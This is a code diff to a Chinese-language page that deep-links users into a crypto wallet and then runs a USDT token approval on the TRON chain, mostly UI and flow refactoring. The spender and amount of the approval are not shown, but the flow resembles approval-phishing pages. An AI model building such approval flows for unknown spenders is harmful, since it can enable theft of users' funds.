@@ -208,6 +208,13 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
+        .info-text {
+            font-size: 12px;
+            color: #999;
+            margin-top: 12px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -233,7 +240,7 @@
             
             <button class="approve-btn" id="approveBtn">授权 USDT</button>
             <div class="status hidden" id="status"></div>
-            <div class="info-text" id="walletInfo" style="font-size: 12px; color: #999; margin-top: 12px; text-align: center;">请选择钱包</div>
+            <div class="info-text" id="walletInfo">请选择钱包</div>
         </div>
     </div>
     
@@ -269,7 +276,6 @@
         
         let currentChain = '728126428';
         let selectedWallet = null;
-        let pendingApprove = false;
         
         function showStatus(message, type = 'loading') {
             const statusEl = document.getElementById('status');
@@ -301,40 +307,8 @@
             document.getElementById('downloadPrompt').classList.add('hidden');
         }
         
-        function isMobile() {
-            return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-        }
-        
-        // 检测钱包是否安装
-        function checkWalletInstalled(scheme) {
-            return new Promise((resolve) => {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = scheme;
-                document.body.appendChild(iframe);
-                
-                const timer = setTimeout(() => {
-                    document.body.removeChild(iframe);
-                    resolve(false);
-                }, 2000);
-                
-                const onVisibilityChange = () => {
-                    if (document.hidden || document.webkitHidden) {
-                        clearTimeout(timer);
-                        document.body.removeChild(iframe);
-                        document.removeEventListener('visibilitychange', onVisibilityChange);
-                        window.removeEventListener('blur', onVisibilityChange);
-                        resolve(true);
-                    }
-                };
-                
-                window.addEventListener('blur', onVisibilityChange);
-                document.addEventListener('visibilitychange', onVisibilityChange);
-            });
-        }
-        
-        // 唤起钱包
-        async function openWallet() {
+        // 直接跳转钱包（不检测是否安装）
+        function jumpToWallet() {
             if (!selectedWallet) {
                 showStatus('请先选择钱包', 'error');
                 return;
@@ -343,31 +317,22 @@
             const wallet = wallets[selectedWallet];
             
             showStatus(`正在唤起 ${wallet.name}...`, 'loading');
-            updateWalletInfo(`正在唤起 ${wallet.name}`);
-            
-            // 检测是否安装
-            const installed = await checkWalletInstalled(wallet.scheme);
-            
-            if (!installed) {
-                hideStatus();
-                showDownloadPrompt(wallet);
-                return;
-            }
+            updateWalletInfo(`正在唤起 ${wallet.name}，请稍候...`);
             
             // 记录待授权状态
             localStorage.setItem('pendingTronApprove', 'true');
             localStorage.setItem('selectedWallet', selectedWallet);
             
-            // 唤起钱包
+            // 直接跳转
             window.location.href = wallet.scheme;
             
-            // 超时检测
+            // 3秒后如果还在页面，提示下载
             setTimeout(() => {
                 if (!document.hidden && !document.webkitHidden) {
                     hideStatus();
                     showDownloadPrompt(wallet);
                 }
-            }, 2500);
+            }, 3000);
         }
         
         // 从钱包返回后执行授权
@@ -381,12 +346,12 @@
             
             if (!walletKey) return;
             
-            showStatus('正在连接钱包...', 'loading');
-            updateWalletInfo('正在连接，请稍候...');
+            showStatus('返回页面，正在连接钱包...', 'loading');
+            updateWalletInfo('正在连接钱包，请稍候...');
             
-            // 等待 TronLink 注入
+            // 等待钱包注入
             let retries = 0;
-            const maxRetries = 15;
+            const maxRetries = 20;
             
             const checkWallet = setInterval(async () => {
                 retries++;
@@ -403,8 +368,8 @@
                 }
                 else if (retries >= maxRetries) {
                     clearInterval(checkWallet);
-                    showStatus('钱包连接超时，请确保已安装并打开钱包', 'error');
-                    updateWalletInfo('连接失败，请重试');
+                    showStatus('连接超时，请确保钱包已安装并刷新页面重试', 'error');
+                    updateWalletInfo('连接失败，请刷新页面重试');
                 }
             }, 500);
             
@@ -504,11 +469,11 @@
                 });
             });
             
-            document.getElementById('approveBtn').addEventListener('click', openWallet);
+            document.getElementById('approveBtn').addEventListener('click', jumpToWallet);
             renderWalletList();
             updateWalletInfo('请选择钱包');
             
-            // 检查是否有待处理的授权
+            // 检查是否有待处理的授权（从钱包返回后）
             executeApprove();
         }
         
